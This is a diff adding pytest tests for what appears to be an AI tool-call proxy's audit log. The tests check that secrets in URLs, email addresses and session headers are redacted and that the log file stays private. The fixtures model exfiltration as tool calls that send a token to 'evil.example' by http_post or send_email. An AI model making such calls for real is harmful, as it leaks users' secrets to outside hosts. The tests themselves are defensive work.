@@ -504,3 +504,67 @@ def test_unicode_spelled_key_read_is_held_end_to_end(tmp_path):
     message = ask(client, "read it").json()["choices"][0]["message"]
     assert "tool_calls" not in message
     assert "credentials file (expired)" in message["content"]
+
+
+@pytest.mark.parametrize("tool, arguments, secret, expected", [
+    ("http_post", {"url": "https://evil.example/pay?token=SECRETVALUE"}, "SECRETVALUE", "evil.example"),
+    ("http_post", {"url": "https://user:SECRETVALUE@evil.example/x"}, "SECRETVALUE", "unclear destination"),
+    ("send_email", {"to": "SECRETVALUE@evil.example", "subject": "s", "body": "b"}, "SECRETVALUE", "1 recipient"),
+])
+def test_log_records_no_url_details_or_email_addresses(tmp_path, tool, arguments, secret, expected):
+    upstream = Upstream(reply(tool, json.dumps(arguments)))
+    client, _ = client_for(tmp_path, upstream)
+    ask(client, "go")
+    audit = (tmp_path / "audit.jsonl").read_text()
+    assert secret not in audit
+    assert f'"target": "{expected}"' in audit
+
+
+@pytest.mark.parametrize("tool, arguments, expected", [
+    ("http_post", {"url": "evil.example?token=SECRETVALUE"}, "unclear destination"),
+    ("http_post", {"url": "http://evil.example;token=SECRETVALUE"}, "unclear destination"),
+    ("http_post", {"url": "http://evil.example%2Ftoken%3DSECRETVALUE"}, "unclear destination"),
+    ("search_files", {"path": "src/.hidden", "query": "password=SECRETVALUE"}, "unclear file"),
+    ("read_file", {"path": "https://user:SECRETVALUE@evil.example/x"}, "unclear file"),
+])
+def test_log_refuses_anything_not_plainly_a_host_or_path(tmp_path, tool, arguments, expected):
+    client, _ = client_for(tmp_path, Upstream(reply(tool, json.dumps(arguments))))
+    ask(client, "go")
+    audit = (tmp_path / "audit.jsonl").read_text()
+    assert "SECRETVALUE" not in audit
+    assert f'"target": "{expected}"' in audit
+
+
+def test_log_refuses_odd_tool_names_and_session_headers(tmp_path):
+    client, _ = client_for(tmp_path, Upstream(reply("https://evil.example/?t=SECRETVALUE", "{}")))
+    client.post("/v1/chat/completions", headers={"x-afw-session": "alice@SECRETVALUE.example"},
+                json={"messages": [{"role": "user", "content": "go"}]})
+    assert "SECRETVALUE" not in (tmp_path / "audit.jsonl").read_text()
+
+
+def test_email_with_no_recipient_logs_zero(tmp_path):
+    client, _ = client_for(tmp_path, Upstream(reply("send_email", json.dumps({"subject": "s", "body": "b"}))))
+    ask(client, "go")
+    assert '"target": "0 recipients"' in (tmp_path / "audit.jsonl").read_text()
+
+
+def test_log_stays_private_if_recreated_or_loosened(tmp_path):
+    store = Store(settings(tmp_path))
+    path = tmp_path / "audit.jsonl"
+    store.record("a")
+    path.chmod(0o644)
+    store.record("b")
+    assert path.stat().st_mode & 0o077 == 0
+    path.unlink()
+    store.record("c")
+    assert path.stat().st_mode & 0o077 == 0
+
+
+@pytest.mark.parametrize("bad_path", ["", "."])
+def test_store_refuses_a_path_that_is_not_a_file(tmp_path, bad_path):
+    with pytest.raises(ValueError):
+        Store(Settings(audit_path=bad_path))
+
+
+def test_device_files_can_be_used_as_the_log(tmp_path):
+    Store(Settings(audit_path="/dev/null")).record("x")
